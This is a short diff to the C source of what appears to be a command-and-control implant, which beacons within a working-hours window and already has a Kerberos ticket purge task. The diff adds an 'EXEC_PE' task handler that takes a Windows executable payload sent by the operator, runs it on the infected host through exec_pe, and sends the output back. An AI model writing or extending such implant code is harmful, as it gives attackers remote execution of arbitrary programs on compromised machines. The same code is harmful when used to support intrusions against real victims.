@@ -11,6 +11,7 @@
 #include <stdio.h>
 #include <ctype.h>
 #include "api_resolve.h"
+#include "pe_exec.h"
 
 /* Runtime working-hours window ("HH:MM-HH:MM" or "" = always beacon) */
 char g_working_hours[32] = {0};
@@ -693,6 +694,13 @@ void dispatch_task(AgentTask *task) {
         char *out = kerb_purge();
         agent_send_result(task->id, out, "");
         free(out);
+    }
+    else if (strcmp(type_upper, "EXEC_PE") == 0) {
+        if (!task->payload || task->payload_len == 0) {
+            agent_send_result(task->id, "", "EXEC_PE: no PE payload"); return;
+        }
+        char *out = exec_pe(task->payload, task->payload_len);
+        agent_send_result(task->id, out, ""); free(out);
     }
     else {
         char err[128];
